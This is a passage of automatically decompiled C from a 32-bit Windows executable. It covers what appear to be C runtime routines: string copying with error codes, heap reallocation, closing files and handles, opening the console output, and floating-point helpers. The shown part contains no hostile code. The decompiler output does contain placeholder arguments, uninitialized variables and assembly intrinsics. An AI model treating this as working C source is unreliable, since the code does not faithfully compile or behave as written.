    // 0x40f68a
    return function_406b2c();
  lab_0x40f48b:;
    int32_t v46 = v19 + a3; // 0x40f491
    v23 = v46;
    if (v46 <= v17) {
        int32_t v47; // 0x40f300
        int32_t v48 = v47;
        *v5 = v14;
        *v6 = v48;
        v23 = v48;
        while (function_406b3d() < 1) {
            int32_t v49 = v48 + a3; // 0x40f491
            v47 = v49;
            v23 = v49;
            if (v49 > v17) {
                // break -> 0x40f4c2
                break;
            }
            v48 = v47;
            *v5 = v14;
            *v6 = v48;
            v23 = v48;
        }
    }
    goto lab_0x40f4c2;
  lab_0x40f662:;
    int32_t v65 = v22 - 1; // 0x40f668
    if (v65 < 0) {
        // break -> 0x40f68a
        goto lab_0x40f68a;
    }
    int32_t v66 = 4 * v65; // 0x40f673
    v10 = *(int32_t *)(v66 + v8);
    v11 = v65;
    v12 = *(int32_t *)(v66 + v9);
    goto lab_0x40f37f;
  lab_0x40f4c2:
    // 0x40f4c2
    v24 = v23;
    int32_t v50 = v28 - a3; // 0x40f4d6
    v15 = v28;
    int32_t v51 = v50; // 0x40f4da
    if (v50 > v14) {
        // 0x40f4dc
        *v5 = v14;
        *v6 = v50;
        int32_t v52 = function_406b3d(); // 0x40f4e0
        int32_t v53 = v50; // 0x40f4ed
        v15 = v28;
        v51 = v50;
        if (v52 >= 0 == (v52 != 0)) {
            int32_t v54 = v53;
            int32_t v55 = v54 - a3; // 0x40f4d6
            v15 = v54;
            v51 = v55;
            while (v55 > v14) {
                // 0x40f4dc
                *v5 = v14;
                *v6 = v55;
                int32_t v56 = function_406b3d(); // 0x40f4e0
                v53 = v55;
                v15 = v54;
                v51 = v55;
                if (v56 >= 0 != v56 != 0) {
                    // break -> 0x40f4f5
                    break;
                }
                v54 = v53;
                v55 = v54 - a3;
                v15 = v54;
                v51 = v55;
            }
        }
    }
    int32_t v57 = v51;
    if (v24 > v57) {
        // break -> 0x40f563
        goto lab_0x40f563;
    }
    int32_t v58 = v14; // 0x40f513
    if (v24 != v57) {
        int32_t v59 = v57; // 0x40f51f
        int32_t v60 = a3; // 0x40f51f
        char * v61 = (char *)v59; // 0x40f521
        char * v62 = (char *)(v24 - v57 + v59); // 0x40f526
        *v62 = *v61;
        *v61 = *v62;
        v60--;
        v59++;
        v58 = v26;
        while (v60 != 0) {
            // 0x40f521
            v61 = (char *)v59;
            v62 = (char *)(v24 - v57 + v59);
            *v62 = *v61;
            *v61 = *v62;
            v60--;
            v59++;
            v58 = v26;
        }
    }
    int32_t v63 = v58;
    int32_t v64 = v63 != v57 ? v26 : v24;
    v25 = v64;
    v27 = v57;
    v13 = v63 != v57 ? v63 : v24;
    v18 = v24;
    goto lab_0x40f450;
  lab_0x40f37f:
    // 0x40f37f
    goto lab_0x40f37f_2;
  lab_0x40f637:
    // 0x40f637
    v22 = v21;
    v10 = v20;
    v11 = v21;
    v12 = v16;
    if (v16 <= v20) {
        goto lab_0x40f662;
    } else {
        goto lab_0x40f37f;
    }
}

// Address range: 0x40f69a - 0x40f74b
int32_t function_40f69a(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t result; // 0x40f69a
    int32_t v1; // 0x40f69a
    if (a4 != 0) {
        if (a1 == 0 || a2 == 0) {
            goto lab_0x40f6d5;
        } else {
            if (a3 != 0) {
                int32_t v2 = a3 - a1; // 0x40f6ec
                int32_t v3 = a2; // 0x40f6f6
                int32_t v4 = a1; // 0x40f6f6
                int32_t v5 = a4; // 0x40f6f6
                int32_t v6 = a2; // 0x40f6f6
                int32_t v7; // 0x40f69a
                if (a4 != -1) {
                    char v8 = *(char *)(a1 + v2); // 0x40f709
                    *(char *)a1 = v8;
                    int32_t v9 = a1 + 1; // 0x40f70e
                    int32_t v10 = v5; // 0x40f711
                    int32_t v11 = v6; // 0x40f711
                    while (v8 != 0) {
                        int32_t v12 = v6 - 1; // 0x40f713
                        v10 = v5;
                        v11 = 0;
                        if (v12 == 0) {
                            // break -> 0x40f71d
                            break;
                        }
                        int32_t v13 = v5 - 1; // 0x40f718
                        v5 = v13;
                        v6 = v12;
                        v10 = v13;
                        v11 = v12;
                        if (v13 == 0) {
                            // break -> 0x40f71d
                            break;
                        }
                        v8 = *(char *)(v9 + v2);
                        *(char *)v9 = v8;
                        v9++;
                        v10 = v5;
                        v11 = v6;
                    }
                    // 0x40f71d
                    v7 = v11;
                    if (v10 == 0) {
                        // 0x40f724
                        *(char *)v9 = 0;
                        v7 = v11;
                    }
                } else {
                    char v14 = *(char *)(v4 + v2); // 0x40f6f8
                    *(char *)v4 = v14;
                    v7 = v3;
                    while (v14 != 0) {
                        int32_t v15 = v3 - 1; // 0x40f702
                        v3 = v15;
                        v4++;
                        v7 = v15;
                        if (v15 == 0) {
                            // break -> 0x40f727
                            break;
                        }
                        v14 = *(char *)(v4 + v2);
                        *(char *)v4 = v14;
                        v7 = v3;
                    }
                }
                // 0x40f727
                if (v7 != 0) {
                    // 0x40f6e6
                    return 0;
                }
                if (a4 == -1) {
                    // 0x40f732
                    *(char *)(a1 - 1 + a2) = 0;
                    // 0x40f6e6
                    return 80;
                }
                // 0x40f73f
                *(char *)a1 = 0;
                v1 = function_40b091();
                result = 34;
                goto lab_0x40f6dc;
            } else {
                // 0x40f6d2
                *(char *)a1 = 0;
                goto lab_0x40f6d5;
            }
        }
    } else {
        if (a1 != 0) {
            if (a2 != 0) {
                // 0x40f6c7
                *(char *)a1 = (char)a4;
                // 0x40f6e6
                return 0;
            }
        } else {
            // 0x40f6af
            if (a2 == a1) {
                // 0x40f6e6
                return 0;
            }
        }
        goto lab_0x40f6d5;
    }
  lab_0x40f6d5:
    // 0x40f6d5
    v1 = function_40b091();
    result = 22;
    goto lab_0x40f6dc;
  lab_0x40f6dc:
    // 0x40f6dc
    *(int32_t *)v1 = result;
    // 0x40f6e6
    return result;
}

// Address range: 0x40f74b - 0x40f756
int32_t function_40f74b(int32_t a1) {
    int32_t result = function_40f69a((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40f751
    return result;
}

// Address range: 0x40f760 - 0x40f7a0
int32_t function_40f760(int16_t a1, int32_t a2) {
    unsigned char v1 = *(char *)a2; // 0x40f774
    int32_t v2 = v1; // 0x40f776
    int32_t v3 = v2; // 0x40f778
    int32_t v4 = a2; // 0x40f778
    int32_t v5 = 0; // 0x40f778
    int32_t v6 = 0; // 0x40f778
    int32_t v7 = 0; // 0x40f778
    if (v1 != 0) {
        v4++;
        v5 |= 1 << (v2 & 31);
        unsigned char v8 = *(char *)v4; // 0x40f774
        int32_t v9 = v8; // 0x40f776
        v3 = v3 & -256 | v9;
        v6 = v5;
        v7 = v3;
        while (v8 != 0) {
            // 0x40f77a
            v4++;
            v5 |= 1 << (v9 & 31);
            v8 = *(char *)v4;
            v9 = v8;
            v3 = v3 & -256 | v9;
            v6 = v5;
            v7 = v3;
        }
    }
    int32_t v10 = v7; // 0x40f786
    int32_t v11 = a1;
    unsigned char v12 = *(char *)v11; // 0x40f788
    int32_t v13 = v12; // 0x40f78a
    v10 = v10 & -256 | v13;
    int32_t result = v10; // 0x40f78c
    while (v12 != 0) {
        // 0x40f78e
        result = v11;
        if ((1 << (v13 & 31) & v6) != 0) {
            // break -> 0x40f79a
            break;
        }
        v11++;
        v12 = *(char *)v11;
        v13 = v12;
        v10 = v10 & -256 | v13;
        result = v10;
    }
    // 0x40f79a
    return result;
}

// Address range: 0x40f7a0 - 0x40f7b7
int32_t function_40f7a0(int32_t a1, int32_t a2) {
    // 0x40f7a0
    int32_t v1; // 0x40f7a0
    return function_40f7b7(a1, a2, 0, v1);
}

// Address range: 0x40f7b7 - 0x40f844
int32_t function_40f7b7(uint32_t a1, uint32_t a2, int32_t a3, int32_t a4) {
    // 0x40f7b7
    if (a1 == 0) {
        // 0x40f7c5
        *(int32_t *)function_40b091() = 22;
        // 0x40f840
        return 0;
    }
    if (a2 == 0) {
        // 0x40f7e1
        *(int32_t *)function_40b091() = 22;
        // 0x40f840
        return 0;
    }
    // 0x40f7f3
    if (a1 >= a2) {
        // 0x40f840
        return 0;
    }
    // 0x40f7fc
    int32_t v1; // 0x40f7b7
    function_409954(a3, v1);
    int32_t v2 = a2; // 0x40f80e
    int32_t v3; // 0x40f7b7
    if (*(int32_t *)(v3 + 8) != 0) {
        int32_t v4 = a2 - 2; // 0x40f813
        while (v4 >= a1) {
            // 0x40f819
            if ((*(char *)(v3 + 25 + (int32_t)*(char *)v4) & 4) == 0) {
                // break -> 0x40f823
                break;
            }
            v4--;
        }
        // 0x40f823
        v2 = a2 - (a2 - v4 & 1);
    }
    // 0x40f82c
    char v5; // 0x40f7b7
    if (v5 != 0) {
        // 0x40f833
        int32_t v6; // 0x40f7b7
        int32_t * v7 = (int32_t *)(v6 + 848); // 0x40f836
        *v7 = *v7 & -3;
    }
    // 0x40f840
    return v2 - 1;
}

// Address range: 0x40f844 - 0x40f853
int32_t function_40f844(void) {
    // 0x40f844
    return (char)function_40d406() == 0;
}

// Address range: 0x40f853 - 0x40f886
int32_t function_40f853(int32_t lpMem, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    if (lpMem != 0) {
        // 0x40f873
        return HeapSize((int32_t *)g227, 0, (int32_t *)lpMem);
    }
    // 0x40f85e
    *(int32_t *)function_40b091() = 22;
    return -1;
}

// Address range: 0x40f886 - 0x40f8ef
int32_t function_40f886(int32_t a1, uint32_t a2) {
    int32_t v1; // bp-12, 0x40f886
    if (a1 == 0) {
        // 0x40f893
        v1 = a2;
        // 0x40f8c2
        return function_40c196(a2);
    }
    if (a2 == 0) {
        // 0x40f8a6
        function_40c15c(a1);
        // 0x40f8c2
        return 0;
    }
    if (a2 >= 0xffffffe1) {
        // 0x40f8b4
        *(int32_t *)function_40b091() = 12;
        // 0x40f8c2
        return 0;
    }
    int32_t v2 = &v1;
    *(int32_t *)(v2 - 4) = a2;
    *(int32_t *)(v2 - 8) = a1;
    *(int32_t *)(v2 - 12) = 0;
    int32_t v3 = v2 - 16; // 0x40f8dd
    *(int32_t *)v3 = g227;
    int32_t * v4 = HeapReAlloc(&g266, (int32_t)&g266, &g266, (int32_t)&g266); // 0x40f8e3
    while (v4 == NULL) {
        // 0x40f8c5
        if (function_40add6() == 0) {
            // 0x40f8b4
            *(int32_t *)function_40b091() = 12;
            // 0x40f8c2
            return 0;
        }
        // 0x40f8ce
        *(int32_t *)(v2 - 20) = a2;
        if (function_409c72((int32_t)&g266) == 0) {
            // 0x40f8b4
            *(int32_t *)function_40b091() = 12;
            // 0x40f8c2
            return 0;
        }
        v2 = v3;
        *(int32_t *)(v2 - 4) = a2;
        *(int32_t *)(v2 - 8) = a1;
        *(int32_t *)(v2 - 12) = 0;
        v3 = v2 - 16;
        *(int32_t *)v3 = g227;
        v4 = HeapReAlloc(&g266, (int32_t)&g266, &g266, (int32_t)&g266);
    }
    // 0x40f8c2
    return (int32_t)v4;
}

// Address range: 0x40f8ef - 0x40f965
int32_t function_40f8ef(int32_t a1) {
    // 0x40f8ef
    function_406cf0(&g108, 8, (int32_t)&g266);
    int32_t result; // 0x40f95f
    if (g162 < 1) {
        // 0x40f95f
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    // 0x40f904
    int32_t v1; // 0x40f8ef
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x40f904
    int32_t v3 = *v2; // 0x40f904
    if ((v3 & 64) == 0 || g140 == 0) {
        int32_t v4 = v3 & -65; // 0x40f955
        *v2 = v4;
        __asm_ldmxcsr(v4);
    } else {
        int32_t * v5 = (int32_t *)(v1 - 4); // 0x40f914
        *v5 = 0;
        __asm_ldmxcsr(*v2);
        *v5 = -2;
    }
    // 0x40f95f
    result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40f965 - 0x40f966
int32_t function_40f965(void) {
    // 0x40f965
    int32_t result; // 0x40f965
    return result;
}

// Address range: 0x40f967 - 0x40f978
int32_t function_40f967(void) {
    // 0x40f967
    __asm_fnclex();
    int32_t v1; // 0x40f967
    return 0x10000 * v1 / 0x10000;
}

// Address range: 0x40f978 - 0x40f979
int32_t function_40f978(void) {
    // 0x40f978
    int32_t result; // 0x40f978
    return result;
}

// Address range: 0x40f97a - 0x40f9a4
int32_t function_40f97a(int32_t a1, int32_t a2) {
    // 0x40f97a
    __asm_wait();
    int32_t v1; // 0x40f97a
    return 0x10000 * v1 / 0x10000;
}

// Address range: 0x40f9a4 - 0x40f9a5
int32_t function_40f9a4(void) {
    // 0x40f9a4
    int32_t result; // 0x40f9a4
    return result;
}

// Address range: 0x40f9a6 - 0x40f9ff
int32_t function_40f9a6(int32_t a1) {
    // 0x40f9a6
    int32_t v1; // 0x40f9a6
    if ((a1 & 1) != 0) {
        // 0x40f9b4
        v1 = __asm_wait();
    }
    int32_t v2 = v1; // 0x40f9c1
    if ((a1 & 8) != 0) {
        // 0x40f9c3
        __asm_wait();
        __asm_wait();
        int32_t v3; // 0x40f9a6
        v2 = __asm_wait() & -0x10000 | v3 & 0xffff;
    }
    int32_t v4 = v2; // 0x40f9d6
    if ((a1 & 16) != 0) {
        // 0x40f9d8
        v4 = __asm_wait();
    }
    int32_t v5 = v4; // 0x40f9e5
    if ((a1 & 4) != 0) {
        // 0x40f9e7
        v5 = __asm_wait();
    }
    int32_t result = v5; // 0x40f9f3
    if ((a1 & 32) != 0) {
        // 0x40f9f5
        result = __asm_wait();
    }
    // 0x40f9fb
    return result;
}

// Address range: 0x40f9ff - 0x40fa00
int32_t function_40f9ff(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40f9ff
    int32_t result; // 0x40f9ff
    return result;
}

// Address range: 0x40fa01 - 0x40fa11
int32_t function_40fa01(void) {
    // 0x40fa01
    __asm_wait();
    int32_t v1; // 0x40fa01
    return 0x10000 * v1 / 0x10000;
}

// Address range: 0x40fa11 - 0x40fa30
int32_t function_40fa11(int32_t a1, int32_t a2) {
    int32_t result = (int32_t)CreateFileW(L"CONOUT$", 0x40000000, 3, NULL, 3, 0, NULL); // 0x40fa24
    g141 = result;
    return result;
}

// Address range: 0x40fa30 - 0x40fa47
int32_t function_40fa30(void) {
    int32_t handleClosed = g141; // 0x40fa38
    if (g141 <= 0xfffffffd) {
        // 0x40fa3f
        handleClosed = CloseHandle((int32_t *)g141);
    }
    // 0x40fa46
    return handleClosed;
}

// Address range: 0x40fa47 - 0x40fabd
int32_t function_40fa47(int32_t a1) {
    // 0x40fa47
    if (a1 == 0) {
        // 0x40fa54
        *(int32_t *)function_40b091() = 22;
        // 0x40faba
        return -1;
    }
    // 0x40fa69
    if ((*(int32_t *)(a1 + 12) & 0x2000) == 0) {
        // 0x40fab0
        function_40ff92(a1);
        // 0x40faba
        return -1;
    }
    // 0x40fa77
    int32_t v1; // 0x40fa47
    int32_t v2; // 0x40fa47
    int32_t result = function_40ba8d(a1, v1, v2); // 0x40fa78
    function_40ed25(a1);
    int32_t v3 = function_40b92b(a1); // 0x40fa86
    if (function_40fe77(v3) < 0) {
        // 0x40fab0
        function_40ff92(a1);
        // 0x40faba
        return -1;
    }
    int32_t * v4 = (int32_t *)(a1 + 28); // 0x40fa9d
    int32_t v5 = *v4; // 0x40fa9d
    if (v5 != 0) {
        // 0x40faa3
        function_40c15c(v5);
        *v4 = 0;
    }
    // 0x40fab0
    function_40ff92(a1);
    // 0x40faba
    return result;
}

// Address range: 0x40fabd - 0x40fb30
int32_t function_40fabd(void) {
    // 0x40fabd
    function_406cf0(&g109, 16, (int32_t)&g266);
    int32_t v1; // 0x40fabd
    int32_t v2 = *(int32_t *)(v1 + 8); // 0x40fac9
    *(int32_t *)(v1 - 32) = v2;
    int32_t result; // 0x40fb2a
    if (v2 == 0) {
        // 0x40fada
        *(int32_t *)function_40b091() = 22;
        // 0x40fb2a
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    // 0x40faef
    if ((*(int32_t *)(v2 + 12) & 0x1000) == 0) {
        int32_t * v3 = (int32_t *)(v1 - 28); // 0x40fb02
        *v3 = 0;
        function_40ba65(v2);
        int32_t * v4 = (int32_t *)(v1 - 4); // 0x40fb0c
        *v4 = 0;
        *v3 = function_40fa47(v2);
        *v4 = -2;
        function_40fb33();
    } else {
        // 0x40fafa
        function_40ff92(v2);
    }
    // 0x40fb2a
    result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40fb33 - 0x40fb3d
int32_t function_40fb33(void) {
    // 0x40fb33
    int32_t v1; // 0x40fb33
    return function_40ba79(*(int32_t *)(v1 - 32));
}

// Address range: 0x40fb3d - 0x40fb59
int32_t function_40fb3d(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x40fb3d
    if (*(char *)a1 == 0) {
        // 0x40fb57
        return 0;
    }
    int32_t v1 = 0; // 0x40fb49
    int32_t result = a2; // 0x40fb4e
    while (v1 != a2) {
        // 0x40fb50
        v1++;
        result = v1;
        if (*(char *)(v1 + a1) == 0) {
            // break -> 0x40fb57
            break;
        }
        result = a2;
    }
    // 0x40fb57
    return result;
}

// Address range: 0x40fb60 - 0x40fcb0
int32_t function_40fb60(int32_t a1, int32_t a2, int32_t a3) {
    bool v1 = true; // 0x40fb67
    if (g259 != 0) {
        // 0x40fb6d
        int16_t v2; // 0x40fb60
        __asm_stmxcsr((int32_t)v2);
        v1 = false;
        int32_t v3; // 0x40fb60
        if ((v2 & 0x7f80) == 0x1f80 == (v3 & 127) == 127) {
            // 0x40fb9a
            return (float32_t)function_40fff8((int32_t)&g266);
        }
    }
    // 0x40fbef
    function_4106b5();
    int32_t v4 = __asm_wait(); // 0x40fbf9
    if (v1) {
        if ((v4 & 0xfffff || a2) == 0) {
            if (v4 > -1) {
                goto lab_0x40fc25;
            } else {
                goto lab_0x40fc91;
            }
        } else {
            // 0x40fc6f
            function_41069c();
            goto lab_0x40fc91;
        }
    } else {
        if ((a3 & 0x7ff00000) == 0) {
            if (a3 <= -1 || (a3 & 0xfffff || a2) == 0) {
                goto lab_0x40fc91;
            } else {
                goto lab_0x40fc25;
            }
        } else {
            if (a3 <= -1) {
                goto lab_0x40fc91;
            } else {
                goto lab_0x40fc25;
            }
        }
    }
  lab_0x40fc25:
    // 0x40fc25
    if (g235 != 0) {
        function_41070e((int32_t)&g266);
    }
    // 0x40fc32
    return function_41071b((int32_t)&g266);
  lab_0x40fc91:
    // 0x40fc91
    if (g235 != 0) {
        function_41070e((int32_t)&g266);
    }
    int32_t result = function_410817((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40fca9
    return result;
}

// Address range: 0x40fcb0 - 0x40fdcd
float80_t function_40fcb0(int64_t a1) {
    int64_t result = a1;
    if (g259 == 0) {
        function_410a6b((int32_t)&g266, (int32_t)&g266);
    }
    // 0x40fcbd
    int32_t v1; // 0x40fcb0
    __asm_stmxcsr(v1);
    int64_t * v2; // 0x40fcb0
    if ((v1 & 0x7f80) == 0x1f80 != (((int32_t)v2 & 127) == 127)) {
        function_410a6b((int32_t)&g266, (int32_t)&g266);
    }
    int128_t v3 = __asm_movq(result); // 0x40fcf0
    int128_t v4 = __asm_movapd(g51); // 0x40fcf6
    int128_t v5 = __asm_movapd(v3); // 0x40fcfe
    int128_t v6 = __asm_movapd(v3); // 0x40fd02
    int128_t v7 = __asm_psrlq(v3, 52); // 0x40fd06
    int32_t v8 = __asm_movd_7(v7); // 0x40fd0b
    int128_t v9 = __asm_psubd(v4, __asm_andpd(v7, g53)); // 0x40fd17
    int128_t v10 = __asm_psrlq_12(v5, v9); // 0x40fd1b
    char v11; // 0x40fcb0
    if ((v8 & 2048) == 0) {
        int128_t v12 = __asm_movq(result); // 0x40fd72
        int128_t v13 = __asm_psllq(v10, v9); // 0x40fd78
        int128_t v14 = __asm_movapd(v12); // 0x40fd7c
        int128_t v15 = __asm_cmpnlepd(v12, v13); // 0x40fd80
        if (v8 < 1023) {
            // 0x40fdb1
            __asm_movq_2(result, __asm_andpd(__asm_cmpnlepd(v14, g52), g50));
            return result;
        }
        // 0x40fd8c
        v11 = llvm_ctpop_i8((char)v8 - 50);
        if (v8 <= 1074) {
            // 0x40fd93
            __asm_movq_2(result, __asm_addsd(v13, __asm_andpd(v15, g50)));
            return result;
        }
    } else {
        if (v8 < 3071) {
            // 0x40fdaa
            return 0.0L;
        }
        int128_t v16 = __asm_psllq(v10, v9); // 0x40fd2d
        v11 = llvm_ctpop_i8((char)v8 - 50);
        if (v8 <= 3122) {
            // 0x40fd38
            __asm_movq_2(result, v16);
            return result;
        }
    }
    // 0x40fd43
    __asm_ucomisd(v6, v6);
    if ((v11 & 1) == 0) {
        // 0x40fd49
        function_410853(&result, &result, &result, 1004);
    }
    // 0x40fd6d
    return result;
}

// Address range: 0x40fdcd - 0x40fe40
int32_t function_40fdcd(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40fdcd
    function_406cf0(&g110, 12, (int32_t)&g266);
    int32_t v1; // 0x40fdcd
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40fdd9
    *v2 = 0;
    function_40de75(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x40fde8
    *v3 = 0;
    int32_t v4 = *(int32_t *)*(int32_t *)*(int32_t *)(v1 + 12); // 0x40fdf1
    int32_t v5 = *(int32_t *)(4 * v4 / 64 + (int32_t)&g207); // 0x40fe00
    int32_t v6; // 0x40fdcd
    if ((*(char *)(v5 + 40 + 48 * (v4 & 63)) & 1) == 0) {
        // 0x40fe19
        *(int32_t *)function_40b091() = 9;
        v6 = -1;
    } else {
        // 0x40fe0e
        v6 = function_40fef6(v4);
    }
    // 0x40fe27
    *v2 = v6;
    *v3 = -2;
    function_40fe43();
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40fe38
    return result;
}

// Address range: 0x40fe43 - 0x40fe4f
int32_t function_40fe43(void) {
    // 0x40fe43
    int32_t v1; // 0x40fe43
    return function_40de98(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40fe4f - 0x40fe77
int32_t function_40fe4f(int32_t a1, int32_t * a2, int32_t a3, int32_t * a4, int32_t a5) {
    int32_t v1 = a1; // bp-12, 0x40fe5d
    int32_t v2 = a1; // bp-16, 0x40fe60
    int32_t v3; // 0x40fe4f
    return function_40fdcd(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40fe77 - 0x40fef6
int32_t function_40fe77(uint32_t a1) {
    int32_t v1 = a1;
    if (a1 == -2) {
        // 0x40fe86
        *(int32_t *)function_40b07e() = 0;
        *(int32_t *)function_40b091() = 9;
        // 0x40fef1
        return -1;
    }
    if (a1 >= 0) {
        // 0x40fe9f
        if (g209 > a1) {
            int32_t v2 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40feb4
            if ((*(char *)(48 * (a1 & 63) + 40 + v2) & 1) != 0) {
                int32_t v3 = &v1; // bp-8, 0x40fec5
                // 0x40fef1
                int32_t v4; // 0x40fe77
                int32_t v5; // 0x40fe77
                return function_40fe4f(a1, &v3, v4, &v1, v5);
            }
        }
    }
    // 0x40fed6
    *(int32_t *)function_40b07e() = 0;
    *(int32_t *)function_40b091() = 9;
    // 0x40fef1
    return -1;
}

// Address range: 0x40fef6 - 0x40ff92
int32_t function_40fef6(int32_t a1) {
    int32_t v1 = a1; // bp-16, 0x40ff00
    int32_t v2 = function_40df4c(a1); // 0x40ff01
    int32_t v3; // bp-12, 0x40fef6
    int32_t v4 = &v3; // 0x40ff06
    int32_t v5 = v4; // 0x40ff0a
    int32_t errorCode = 0; // 0x40ff0a
    if (v2 != -1) {
        // 0x40ff10
        if (a1 != 1) {
            goto lab_0x40ff23;
        } else {
            // 0x40ff1a
            if ((*(char *)(g207 + 136) & 1) != 0) {
                goto lab_0x40ff2e;
            } else {
                goto lab_0x40ff23;
            }
        }
    } else {
        goto lab_0x40ff5e;
    }
  lab_0x40ff5e:;
    int32_t * v6 = (int32_t *)(v5 - 4); // 0x40ff5e
    *v6 = a1;
    function_40debb((int32_t)&g266);
    int32_t v7 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40ff70
    *(char *)(48 * (a1 & 63) + 40 + v7) = 0;
    int32_t result = 0; // 0x40ff7e
    if (errorCode != 0) {
        // 0x40ff80
        *v6 = errorCode;
        function_40b05b();
        result = -1;
    }
    // 0x40ff8e
    return result;
  lab_0x40ff23:
    if (a1 != 2) {
        goto lab_0x40ff44;
    } else {
        // 0x40ff28
        if ((*(char *)(g207 + 88) & 1) == 0) {
            goto lab_0x40ff44;
        } else {
            goto lab_0x40ff2e;
        }
    }
  lab_0x40ff44:;
    int32_t hObject = function_40df4c(a1); // 0x40ff45
    v1 = hObject;
    int32_t v8 = &v1; // 0x40ff4b
    v5 = v8;
    errorCode = 0;
    if (!CloseHandle((int32_t *)hObject)) {
        // 0x40ff56
        v5 = v8;
        errorCode = GetLastError();
    }
    goto lab_0x40ff5e;
  lab_0x40ff2e:
    // 0x40ff2e
    v1 = 2;
    int32_t v9 = function_40df4c(2); // 0x40ff30
    v5 = v4;
    errorCode = 0;
    if (function_40df4c(1) == v9) {
        goto lab_0x40ff5e;
    } else {
        goto lab_0x40ff44;
    }
}

// Address range: 0x40ff92 - 0x40ffcd
int32_t function_40ff92(int32_t a1) {
    // 0x40ff92
    *(int32_t *)a1 = 0;
    *(int32_t *)(a1 + 4) = 0;
    *(int32_t *)(a1 + 8) = 0;
    *(int32_t *)(a1 + 16) = -1;
    *(int32_t *)(a1 + 20) = 0;
    *(int32_t *)(a1 + 24) = 0;
    *(int32_t *)(a1 + 28) = 0;
    int32_t result = a1 + 12; // 0x40ffc6
    *(int32_t *)result = 0;
    return result;
}

// Address range: 0x40ffcd - 0x40ffdc
int32_t function_40ffcd(void) {
    // 0x40ffcd
    g259 = IsProcessorFeaturePresent(10);
    return 0;
}

// Address range: 0x40ffe0 - 0x40fff8
int32_t function_40ffe0(void) {
    // 0x40ffe0
    float80_t v1; // 0x40ffe0
    __asm_movq((int64_t)(int32_t)(float32_t)v1);
    int32_t result; // 0x40ffe0
    return result;
}

// Address range: 0x40fff8 - 0x410264
float80_t function_40fff8(int32_t a1) {
    int32_t v1 = a1;
    int128_t v2; // 0x40fff8
    int128_t v3 = __asm_movlpd_11(v2, (int64_t)a1); // 0x40fffe
    int32_t v4 = -1023; // 0x40fffe
    int128_t v5 = v3;
    int128_t v6 = __asm_movapd(v5); // 0x410003
    int128_t v7 = __asm_unpcklpd(v5, v5); // 0x410007
    int32_t v8 = __asm_pextrw(__asm_psrlq(v6, 52), 0); // 0x410010
    int128_t v9 = __asm_movapd(g54); // 0x410015
    int128_t v10 = __asm_movapd(g55); // 0x41001d
    int128_t v11 = __asm_movapd(g60); // 0x410025
    int128_t v12 = __asm_movapd(g56); // 0x41002d
    int128_t v13 = __asm_movapd(g57); // 0x410035
    int128_t v14 = __asm_orpd(__asm_andpd(v7, v9), v11); // 0x410041
    int32_t v15 = __asm_pextrw(__asm_addpd(v12, v14), 0) & 2032; // 0x41004e
    int128_t v16 = __asm_movapd(*(int128_t *)(v15 + (int32_t)&g68)); // 0x410053
    int128_t v17 = __asm_movapd(*(int128_t *)(v15 + (int32_t)&g67)); // 0x41005b
    int128_t v18 = __asm_andpd(v13, v14); // 0x410063
    int128_t v19 = __asm_subpd(v14, v18); // 0x410067
    int128_t v20 = __asm_subpd(__asm_mulpd(v18, v16), v10); // 0x41006f
    int128_t v21 = __asm_addsd(v17, v20); // 0x410073
    int128_t v22 = __asm_mulpd(v19, v16); // 0x410077
    int128_t v23 = __asm_movapd(v22); // 0x41007b
    int128_t v24 = __asm_addpd(v22, v20); // 0x41007f
    int32_t v25 = v8 & 4095; // 0x410083
    uint32_t v26 = v25 - 1; // 0x410089
    int32_t v27; // 0x40fff8
    int128_t v28; // 0x410164
    int128_t v29; // 0x40fff8
    while (v26 >= 2046) {
        int64_t v30 = v1;
        int128_t v31 = __asm_movlpd_11(v24, v30); // 0x410156
        v28 = __asm_cmpeqsd(__asm_movapd(g61), v31);
        if (__asm_pextrw(v28, 0) != 0) {
            // 0x4101bb
            __asm_divsd(__asm_movlpd_11(v10, (int64_t)g60), v31);
            v29 = __asm_movlpd_11(v28, -0x10000000000000);
            v27 = 8;
            goto lab_0x41020a;
        }
        if (v25 != 0) {
            if (v26 < 2047) {
                int128_t v32 = __asm_movlpd_11(v31, v30); // 0x410180
                int128_t v33 = __asm_movapd(g54); // 0x410186
                int128_t v34 = __asm_movapd(g60); // 0x41018e
                int128_t v35 = __asm_cmpeqsd(v34, __asm_orpd(__asm_andpd(v32, v33), v34)); // 0x41019e
                v29 = v33;
                v27 = 1001;
                if (__asm_pextrw(v35, 0) != 0) {
                    // 0x4101ad
                    return INFINITY;
                }
                goto lab_0x41020a;
            } else {
                if ((v8 & 2047) == 2047) {
                    int128_t v36 = __asm_movlpd_11(v10, v30); // 0x410237
                    __asm_movlpd_11(v31, (int64_t)v1);
                    int32_t v37 = __asm_movd_7(v36); // 0x410243
                    int128_t v38 = __asm_psrlq(v36, 32); // 0x410247
                    v29 = v28;
                    v27 = 1001;
                    if ((__asm_movd_7(v38) & 0xfffff || v37) == 0) {
                        goto lab_0x4101fd;
                    } else {
                        goto lab_0x41020a;
                    }
                } else {
